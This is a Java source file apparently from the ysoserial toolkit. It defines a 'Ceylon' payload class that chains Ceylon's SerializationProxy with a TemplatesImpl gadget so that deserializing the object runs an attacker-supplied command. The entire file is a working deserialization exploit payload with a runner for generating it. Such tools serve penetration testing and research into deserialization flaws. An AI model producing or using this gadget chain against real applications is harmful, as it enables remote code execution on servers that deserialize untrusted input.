package ysoserial.payloads;

import com.redhat.ceylon.compiler.java.language.SerializationProxy;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

@Authors({ Authors.KULLRICH })
@Dependencies({ "org.ceylon-lang:ceylon.language:1.3.3" })
public class Ceylon implements ObjectPayload<Object>
{

	//
	// Probably the simplest deser gadget ever ;-)
	//
	@Override
	public Object getObject(String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);

		return new SerializationProxy (templates, templates.getClass(), "getOutputProperties");
	}

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Ceylon.class, args);
    }
}
